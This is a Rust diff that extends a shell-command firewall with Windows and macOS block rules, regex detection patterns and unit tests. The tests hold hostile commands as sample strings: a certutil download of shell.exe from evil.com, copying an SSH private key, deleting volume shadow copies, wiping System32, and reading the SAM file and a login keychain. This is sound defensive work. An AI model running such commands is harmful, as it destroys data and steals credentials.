@@ -98,6 +98,36 @@ pub static FIREWALL_RULES: &[FirewallRule] = &[
         name: "insmod_rmmod",
         description: "Kernel module manipulation",
     },
+    // --- Windows Specific Rules ---
+    FirewallRule {
+        name: "win_file_delete",
+        description: "Windows file/directory deletion (del, rd /s)",
+    },
+    FirewallRule {
+        name: "win_privilege_esc",
+        description: "Windows privilege escalation (runas)",
+    },
+    FirewallRule {
+        name: "win_sys_disrupt",
+        description: "Windows system disruption (format, vssadmin)",
+    },
+    FirewallRule {
+        name: "win_obfuscated_exec",
+        description: "Windows obfuscated/sensitive execution (powershell -enc, certutil)",
+    },
+    // --- macOS Specific Rules ---
+    FirewallRule {
+        name: "macos_clipboard",
+        description: "macOS clipboard access (pbcopy, pbpaste)",
+    },
+    FirewallRule {
+        name: "macos_screenshot",
+        description: "macOS screen capture (screencapture)",
+    },
+    FirewallRule {
+        name: "macos_file_search",
+        description: "macOS metadata file search (mdfind)",
+    },
 ];
 
 /// The compiled regex set. Each pattern index corresponds to FIREWALL_RULES[i].
@@ -109,10 +139,8 @@ static FIREWALL_SET: Lazy<RegexSet> = Lazy::new(|| {
         r"(?i)\b(mkfs|fdisk|parted|wipefs|gdisk)\b",
         // dd if=... of=/dev/...
         r"(?i)\bdd\b.*\bif\s*=.*\bof\s*=\s*/dev/",
-        // Redirecting to /dev/sd* or /dev/hd* or /dev/nvme*
-        r">\s*/dev/(sd|hd|nvme|xvd|vd)[a-z]",
-        // truncate / shred direct device
-        r"(?i)\btruncate\b.*\s/dev/",
+        // Redirecting to or truncating device files (Rule: truncate_dev)
+        r"(?i)(>\s*/dev/(sd|hd|nvme|xvd|vd)[a-z]|\btruncate\b.*\s/dev/)",
         // shred
         r"(?i)\bshred\b",
         // sudo / su (not 'sudo apt' etc) - block escalation
@@ -129,8 +157,8 @@ static FIREWALL_SET: Lazy<RegexSet> = Lazy::new(|| {
         r#"(?i)(socket\.connect|os\.dup2|subprocess\.call|pty\.spawn)"#,
         // eval | base64 -d | bash / sh  (obfuscation bypass)
         r"(?i)(eval\s*\(|base64\s+-d.*\|\s*(bash|sh|python|perl)|echo.*\|.*base64.*\|.*bash)",
-        // Sensitive paths
-        r"(?i)(/etc/(shadow|passwd|sudoers|crontab|ssh/)|~?/\.ssh/(id_rsa|id_ed25519|authorized_keys)|/proc/(self|[0-9]+)/(mem|maps)|Windows/System32/config/SAM)",
+        // Sensitive paths (Cross-platform: /etc/shadow, ~/.ssh, SAM, macOS Keychains)
+        r"(?i)(/etc/(shadow|passwd|sudoers|crontab|ssh/)|~?/\.ssh/(id_rsa|id_ed25519|authorized_keys)|/proc/(self|[0-9]+)/(mem|maps)|Windows/System32/config/SAM|/Library/Keychains/|/Users/.*/Library/Keychains/)",
         // PATH or LD_PRELOAD override
         r"(?i)(export\s+(LD_PRELOAD|LD_LIBRARY_PATH|PATH\s*=\s*/)|PATH=\s*[^$])",
         // Crontab write
@@ -141,6 +169,22 @@ static FIREWALL_SET: Lazy<RegexSet> = Lazy::new(|| {
         r":\(\)\s*\{",
         // insmod / rmmod / modprobe
         r"(?i)\b(insmod|rmmod|modprobe)\b",
+        // --- Windows Patterns ---
+        // del / rd /s /s /q / erase
+        r"(?i)\b(del|erase|rd)\b.*\s(/[srfqpt]{1,4}\s+){1,3}",
+        // runas /user:Administrator
+        r"(?i)\brunas\b\s+/user:",
+        // format / vssadmin
+        r"(?i)\b(format\b|vssadmin\s+delete\s+shadows)",
+        // powershell -enc / -EncodedCommand / certutil -urlcache
+        r"(?i)(powershell.*-(enc|encodedcommand)|certutil\s+-(urlcache|verifyctl))",
+        // --- macOS Patterns ---
+        // pbcopy / pbpaste
+        r"(?i)\bpb(copy|paste)\b",
+        // screencapture
+        r"(?i)\bscreencapture\b",
+        // mdfind
+        r"(?i)\bmdfind\b",
     ];
 
     RegexSet::new(patterns).expect("Failed to compile shell firewall RegexSet")
@@ -164,7 +208,13 @@ impl ShellFirewall {
     /// Returns a `FirewallVerdict`. If `verdict.blocked == true`, the caller
     /// **must not** execute the command.
     pub fn check(command_text: &str) -> FirewallVerdict {
-        let matches: Vec<usize> = FIREWALL_SET.matches(command_text).into_iter().collect();
+        // Path canonicalization: normalize \ to / for easier regex matching
+        let normalized_command = command_text.replace('\\', "/");
+
+        let matches: Vec<usize> = FIREWALL_SET
+            .matches(&normalized_command)
+            .into_iter()
+            .collect();
 
         if matches.is_empty() {
             return FirewallVerdict {
@@ -252,6 +302,43 @@ mod tests {
         assert!(blocked("cat /etc/shadow"));
         assert!(blocked("cp ~/.ssh/id_rsa /tmp/stolen"));
         assert!(blocked("cat /etc/sudoers"));
+        // Windows sensitive paths (normalized)
+        assert!(blocked("type C:\\Windows\\System32\\config\\SAM"));
+    }
+
+    #[test]
+    fn test_windows_deletion_blocked() {
+        assert!(blocked("del /f /q C:\\Windows\\System32\\*"));
+        assert!(blocked("rd /s /q C:\\Users"));
+        assert!(blocked("erase /s *.docs"));
+    }
+
+    #[test]
+    fn test_windows_privilege_escalation_blocked() {
+        assert!(blocked("runas /user:Administrator cmd.exe"));
+    }
+
+    #[test]
+    fn test_windows_disruption_blocked() {
+        assert!(blocked("format D: /fs:ntfs"));
+        assert!(blocked("vssadmin delete shadows /all"));
+    }
+
+    #[test]
+    fn test_windows_obfuscation_blocked() {
+        assert!(blocked("powershell -enc BASE64_DATA"));
+        assert!(blocked("powershell.exe -EncodedCommand XXXXX"));
+        assert!(blocked("certutil -urlcache -f http://evil.com/shell.exe"));
+    }
+
+    #[test]
+    fn test_macos_specific_blocked() {
+        assert!(blocked("pbpaste > /tmp/stolen_clip"));
+        assert!(blocked("screencapture -x /tmp/screen.png"));
+        assert!(blocked("mdfind -name passwords.txt"));
+        assert!(blocked(
+            "cat /Users/admin/Library/Keychains/login.keychain-db"
+        ));
     }
 
     #[test]
